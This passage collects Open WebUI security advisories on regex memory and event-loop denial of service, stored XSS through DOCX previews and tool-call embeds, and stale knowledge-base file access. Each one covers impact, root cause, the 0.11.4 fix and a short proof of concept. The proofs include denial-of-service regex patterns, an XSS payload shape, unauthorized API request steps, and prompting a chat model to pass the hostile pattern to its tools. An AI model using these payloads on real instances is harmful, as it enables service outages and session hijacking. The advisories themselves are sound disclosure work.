## Preconditions - Default configuration. The knowledge builtin tool group is enabled by default, and with `ENABLE_KB_EXEC` at its default of `False` the model is handed the knowledge grep tool, which is the affected path. The chat file grep tool and the `kb_exec` grep command share the same pattern compiler and are affected the same way. - Any authenticated user, no elevated role and no workspace permission. - One file the attacker can read. The tool returns early when no readable file is in scope, so a file is required, and `USER_PERMISSIONS_CHAT_FILE_UPLOAD` defaults to true so the attacker can supply their own. - A model willing to call the tool with the attacker's literal pattern. This is the one non-deterministic step: reliable in practice by instructing the model in your own chat, but not guaranteed on a given turn. - Only releases 0.11.0 through 0.11.3 carry the code. Earlier releases compiled with Python's standard library engine, which does not expand repetition this way and is unaffected. Releases 0.11.1 to 0.11.3 added a check on repetition counts, but it could be sidestepped with an escaped character or inline verbose mode, so those releases remain affected. - Deployments running with `UVICORN_WORKERS` at its default of 1 lose the whole instance; multi-worker deployments lose one worker per request.
## Impact Availability, against every other user of the affected worker. Peak allocation grows with the fourth power of the repetition count while the pattern stays the same length, so the attacker chooses the cost by editing two digits, and the compiled result is then retained in the engine's pattern cache, which holds up to 500 entries before it evicts anything. Each distinct pattern is therefore a permanent bite out of the worker rather than a spike that unwinds: measured directly, one pattern at a repetition count of 40 retained about 740 MB, six distinct patterns at counts of 30 to 35 retained 1.38 GB together, and under a 2 GB memory limit the next compile failed with the process out of memory. A modest sequence of requests walks the process into memory exhaustion with no recovery short of a restart, and a deployment whose container memory limit sits below the peak loses the worker outright. While each compile runs, the work happens synchronously on the event loop, so the worker serves nobody else for its duration. There is no confidentiality or integrity effect, and no data is read or altered.
## Fix Fixed in 0.11.4 by https://github.com/open-webui/open-webui/commit/97e013a66169c4fcd7f26ab9e41a4ff260ffd4da. Search patterns are now compiled with RE2, which refuses oversized repetition and runs under a fixed 1 MiB memory limit for the compiled pattern, and search patterns are also capped in length. Ordinary search patterns are unaffected, though regex searches now follow RE2 syntax (no lookarounds or backreferences). Upgrading is sufficient; there is nothing an operator has to configure.
## Root cause - `backend/open_webui/tools/knowledge_fs.py`, `build_matcher`: compiled the caller's pattern with no limit on the result. - `backend/open_webui/tools/builtin.py`, `grep_knowledge_files`: the default-configuration caller that passes an unvalidated pattern to it; `grep_chat_files` and the `kb_exec` grep command reach the same function. - Affected setup: releases 0.11.0 through 0.11.3.
The earlier fix for catastrophic backtracking moved matching to an engine that supports a per-search timeout and placed every search under a shared time budget. That budget is acquired after the pattern has been compiled, so by construction it governs matching only. The replacement engine materialises counted repetition at compile time, which the previous one did not, so the migration introduced a new cost on a step that had never needed a limit before and that the budget was never positioned to cover. The pattern reached the compiler with no check beyond being non-empty. The count check added in 0.11.1 scanned the raw pattern text for repetition counts, so any spelling the engine reads as a count but the scan did not recognise went through unchecked.
## Proof of concept Against a running instance, as a user with the default `user` role and no workspace permissions:
1. Upload any small text file. 2. In a chat on a model with the knowledge tools available, have the model grep that file for `((((a{40}){40}){40}){40})|x`. 3. The worker allocates several hundred megabytes inside the compile, and requests arriving from other connections during that window are delayed by the full duration. Repeating the request with different repetition counts adds to the total rather than reusing it.
Observed on the vulnerable code, with the tool call driven by a stub upstream so the model's choice to call the tool is deterministic. Everything from the tool call onward is unmodified Open WebUI code. Worker memory growth and the delay seen by a concurrent request on a second connection:
| repetition count | worker memory | concurrent request delayed by | | ---------------- | ------------- | ----------------------------- | | literal pattern | 0.1 MB | 20 ms | | 32 | 273 MB | 219 ms | | 40 | 612 MB | 513 ms |
The pattern is 27 bytes at every row, so limiting the length of the input does not bound the cost. The engine used before 0.11.0 compiles all of these in under a millisecond with no measurable allocation, and 0.11.4 rejects them outright.
## Credits @baeseungwon1010, for identifying that compilation runs outside the matching budget.

item.title: [MEDIUM] open-webui/open-webui — Any authenticated user can repeatedly stall a worker via file-search regex on the event loop
item.description:
CVSS 4.3 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:L) · CWE-1333
Affected: - pip/open-webui >= 0.11.0, < 0.11.4 (patched: 0.11.4)
---
# Any authenticated user can repeatedly stall a worker via file-search regex on the event loop
## Summary The built-in file search tools let a chat participant choose the pattern used to grep files. Since 0.11.0 each search has been capped at 2 seconds of matching time, but the matching itself still ran directly on the server's event loop. A crafted pattern that backtracks until the cap is hit therefore froze the whole worker for about 2 seconds on every call, and nothing stopped the calls from being repeated.
## Preconditions - Default configuration. The knowledge builtin tool group is enabled by default, and with `ENABLE_KB_EXEC` at its default of `False` the model is offered `grep_knowledge_files`, which accepts a file id. - Any authenticated user, no elevated role and no workspace permission. - One file the attacker can read. `USER_PERMISSIONS_CHAT_FILE_UPLOAD` defaults to true and a user can always read their own upload. - A model willing to call the tool with the attacker's literal pattern. This is reliable in practice by instructing the model in your own chat, but not guaranteed on a given turn. - The chat file tool `grep_chat_files` is affected the same way, but it is only offered when a model's File Context capability has been turned off. - Deployments running with `UVICORN_WORKERS` at its default of 1 stall the whole instance; multi-worker deployments stall one worker per call.
## Impact Availability, against every other user of the affected worker. Each call held the event loop for the full 2 second budget, during which the worker handled no other request, and every further call from the same or another chat held it again. The same file searched with a literal pattern finished in a few milliseconds. There is no confidentiality or integrity effect, and no data is read or altered.
## Fix Fixed in 0.11.4. https://github.com/open-webui/open-webui/pull/29621 moved the built-in chat and knowledge file searches off the event loop into a worker thread, the knowledge filesystem search was moved off the event loop the same way, and pattern matching switched to the RE2 engine, which runs in linear time and cannot backtrack catastrophically. Upgrading is sufficient; there is nothing an operator has to configure.
## Root cause - `backend/open_webui/tools/builtin.py`, `grep_knowledge_files` and `grep_chat_files`: called the synchronous file search directly from the async tool. - `backend/open_webui/tools/knowledge_fs.py`, `build_matcher`: compiled the caller's pattern with a backtracking engine under a 2 second timeout. - Affected builds: 0.11.0 through 0.11.3. Earlier versions had no time limit at all and are covered by GHSA-2f54-p244-32q6.
The fix for GHSA-2f54-p244-32q6 bounded how long one search could run, but a time limit on a synchronous call does not give the event loop back while the call is running. The search still executed on the loop thread, so for the whole budget the worker could not serve anyone else, and the budget reset on every tool call.
## Proof of concept Against the tool code of 0.11.3 as an ordinary user:
1. Upload a text file whose content is a single line of 28 `a` characters followed by `!`. 2. In a chat, instruct the model to call `grep_knowledge_files` with the pattern `(a|a)+$` and that file's id. 3. The tool returns `Search exceeded 2s, narrow the pattern` after about 2 seconds. A task scheduled every 50 ms on the same event loop does not run for 2.06 seconds while the search is in progress. Repeating the call repeats the stall.
Measured by running the real tool functions of each release with a concurrent 50 ms event-loop heartbeat (file lookup seeded directly with the file above):
| version | tool | call time | longest heartbeat gap | | ------- | ---- | --------- | --------------------- | | 0.11.3 | grep_knowledge_files | 2.007s | 2.057s | | 0.11.3 | grep_chat_files | 2.009s | 2.059s | | 0.11.4 | grep_knowledge_files | 0.004s | 0.051s | | 0.11.4 | grep_chat_files | 0.005s | 0.051s |
## Credits @yousif-IQ, for the finding. @tahahassan773, analysis.

item.title: [HIGH] open-webui/open-webui — Any authenticated user can steal another user's session token via script embedded in a DOCX preview
item.description:
CVSS 8.7 (CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N) · CWE-79, CWE-1021
Affected: - pip/open-webui >= 0.11.1, <= 0.11.3 (patched: 0.11.4)
---
# Any authenticated user can steal another user's session token via script embedded in a DOCX preview
## Summary Any authenticated user who can upload a DOCX attachment can embed active content in it that runs in the browser of anyone who previews the file, in the Open WebUI page origin. The preview renders a document-supplied HTML part and keeps document-supplied link targets without restriction, so embedded script reads the viewer's session token from local storage. When the viewer is an administrator, replaying that token grants full administrative control of the instance with no password.
## Preconditions - An approved account (role `user` or higher) able to upload DOCX attachments. New sign-ups start as `pending` by default (`DEFAULT_USER_ROLE=pending`) and cannot upload until an administrator approves them. - The victim must open the shared chat, open the attachment and switch to the Preview view (one user interaction). - No non-default configuration is required. The behaviour is present out of the box on affected versions.
## Impact The embedded script executes in the Open WebUI origin in the viewer's authenticated session and can read the session token. A stolen administrator token replays directly against the API without a password, giving the attacker the full administrator capability set (enumerating all users, changing roles, reading all chats and documents, creating API keys, changing instance settings). A low-privileged attacker thereby escalates to full instance control through one previewed document. Instances where DOCX preview is never used by higher-privileged users are not affected in practice.
## Fix Fixed in v0.11.4 by #29699. The DOCX preview no longer renders embedded HTML parts (the renderer is told not to inline document-supplied HTML sub-documents), and after rendering any link target that does not resolve to http, https, mailto or tel is removed. Upgrading to v0.11.4 or later fully resolves the issue with no further configuration.
## Root cause The affected component is the DOCX preview (`src/lib/components/common/DocxPreview.svelte`), present from v0.11.1 onward. It rendered uploaded documents through the preview renderer on its main path with the renderer's default behaviour, which inlines a document-supplied HTML part into a same-origin frame and preserves document-supplied link targets verbatim. Sanitization existed only on a fallback branch that the normal render path did not reach, so a crafted document embedding an HTML part, or a link with a script scheme, executed in the page origin when previewed.
## Proof of concept A crafted `.docx` containing a body-level OOXML altChunk pointing to an internal HTML part, and a hyperlink with a script scheme, was rendered with the affected version's option set and the fixed version's option set using the shipped renderer. Under the affected options the HTML part was inlined into a same-origin frame and the script-scheme link target was preserved and executed. Under the fixed options the embedded part was skipped and the unsafe link target was removed, so neither path executed.
## Credits @Observerkay: reported the stored XSS in the DOCX preview via the OOXML altChunk mechanism, with an end-to-end token-theft to administrator-takeover proof of concept.

item.title: [MEDIUM] open-webui/open-webui — Stored XSS via user-authored tool-call embeds in the Markdown renderer
item.description:
CVSS 4.6 (CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:L/I:L/A:N) · CWE-79
Affected: - pip/open-webui >= 0.6.31, < 0.11.4 (patched: 0.11.4)
---
# Stored XSS via user-authored tool-call embeds in the Markdown renderer
## Summary Any authenticated user can execute arbitrary JavaScript in other users' browsers by sending content shaped as a tool-call `<details>` block. The Markdown renderer parsed the block's `embeds` attribute without distinguishing server-generated tool-call output from user-authored input, decoded and JSON-parsed it, and mounted each element in a sandboxed iframe with scripts enabled, so it ran at render time for every viewer. The missing control is a trust gate separating user content from the tool-call embed path.
## Preconditions An authenticated account on the instance. The primary demonstrated surface is channel messages, which requires the Channels feature enabled by an admin (`ENABLE_CHANNELS`, off by default); the same gadget also reaches main-chat user messages and citation previews of retrieved documents, which need no special feature flag. No elevated role is required. By default the embed iframe is sandboxed `allow-scripts` without `allow-same-origin`, so the injected script runs in an opaque origin.
## Impact The injected script executes in a null-origin sandboxed iframe for anyone who views the message or opens the citation. In the default configuration it cannot read the viewer's session token or make same-origin authenticated requests; the confirmed default primitive is contained script execution and convincing in-app phishing content rendered inside the interface. Where an operator has turned on `iframeSandboxAllowSameOrigin`, the sandbox gains `allow-same-origin` and the script can read `localStorage` (session token) and act as the victim, raising the impact to session hijacking. The payload is stored, so it re-executes on every view.
## Fix Fixed in 0.11.4 by PR #29985. Embed rendering is now opt-in: the flag defaults off and is forwarded through every Markdown render path, including the standalone tool-call branch, colon fences and alerts. Assistant responses opt in only for the viewer's own chat; channel messages and read-only/shared views pass it explicitly off, so user-authored content can no longer reach the embed iframe. Upgrading to 0.11.4 fully resolves the issue with no additional configuration.
## Root cause The tool-call embed sink lives in the shared Markdown renderer: `ToolCallDisplay.svelte` and `ConsecutiveDetailsGroup.svelte` read the `embeds` attribute off a `<details type="tool_calls">` token and mount each element in `FullHeightIframe` with `allowScripts={true}`. The renderer never distinguished tokens produced by the tool-execution pipeline from tokens parsed out of arbitrary user-authored message content, and the later `allowEmbeds` guard was applied only to the grouped path, so a single standalone details block bypassed it entirely and reached the iframe on every surface that renders user content.
## Proof of concept Reproduced on stock 0.11.3 with default settings and Channels enabled. A non-admin account posted a channel message whose content was `<details type="tool_calls" embeds="["<script>...</script>"]">...</details>`. Opening the channel rendered one iframe with `sandbox="allow-scripts allow-popups allow-downloads"` and the attacker HTML in `srcdoc`, and the injected script executed in the viewer's browser (null origin). The same message on 0.11.4 renders no iframe and no script runs.
## Credits @KadirArslan: channel messages, original report and proof of concept. @5yu4n: cross-user delivery through channel direct messages. @ComputerOnFire: citation previews of knowledge-base documents, and the ungated standalone-block path.

item.title: [MEDIUM] open-webui/open-webui — Knowledge base collaborators keep read and delete access to removed files via stale file metadata
item.description:
CVSS 5.0 (CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:L) · CWE-863
Affected: - pip/open-webui >= 0.6.0, < 0.11.4 (patched: 0.11.4)
---
# Knowledge base collaborators keep read and delete access to removed files via stale file metadata
## Summary A user who has been granted access to a shared knowledge base keeps access to a file after the owner removes that file from the knowledge base. With a read grant they can still download the file, and with a write grant they can delete it for everyone, including from other private knowledge bases of the owner that they cannot open. The file access check trusted a knowledge base reference cached on the file record and never confirmed that the file is still attached to that knowledge base.
## Preconditions - Default configuration. No setting needs to be changed. - The attacker is an ordinary user who holds a read grant (to read) or a write grant (to delete) on a knowledge base owned by the victim. - The file was last processed into that shared knowledge base. If it was processed into another knowledge base afterwards, the cached reference points elsewhere and the issue does not occur. - The owner removes the file from the shared knowledge base in a way that keeps the file on the instance: the knowledge base sync cleanup when the file is still attached to another knowledge base, or, up to 0.11.0, resetting the knowledge base. - The attacker knows the file id, which they could see while the file was still shared with them.
## Impact After the file has been removed from the shared knowledge base, the former collaborator can still download its content and, with a write grant, delete it. Deletion removes the file from every knowledge base that still references it, including the owner's private ones that the attacker never had access to. Exploitation depends on the owner's own actions (processing order and how the file was removed), so an attacker cannot force it. Files that were never shared through a knowledge base, and knowledge bases the attacker was never granted, are not affected.
## Fix Fixed in PR #29937. Knowledge base access to a file is now derived only from the file's current knowledge base associations, and the cached reference on the file record is no longer consulted. Upgrading is sufficient.
## Root cause - Component: `has_access_to_file` in `backend/open_webui/utils/access_control/files.py` (in `backend/open_webui/routers/files.py` before 0.8.6), used by the file content, update, rename and delete endpoints. - Affected setup: every build from 0.6.0 to 0.11.3.
When a file is processed into a knowledge base, the id of that knowledge base is stored in the file's metadata. The access check granted access to anyone with the matching permission on the knowledge base named there, but it never checked that the file was still attached to it. Removing a file from a knowledge base does not clear that value, so the old knowledge base's grants kept applying to the file after it had been removed.
## Proof of concept 1. As the owner, create private knowledge bases B and A and upload a text file containing a unique marker. 2. Add the file to B and let it process, then add it to A and let it process. 3. Grant the attacker read and write on A with `POST /api/v1/knowledge/{A}/access/update`. 4. As the attacker, `GET /api/v1/files/FILE_ID/content` returns 200 with the marker. 6. As the attacker, `DELETE /api/v1/files/FILE_ID` returns 200, and the file is removed from B. 7. Control: with processing order A then B, both requests return 404.
The reporter reproduced this over HTTP on a running instance. It was independently reproduced on 0.11.3 (sync cleanup) and on 0.6.0 and 0.11.0 (knowledge base reset) against the real routers, with the users, knowledge bases, grants and the cached processing reference seeded directly into the database. On 0.11.4 both requests return 404.
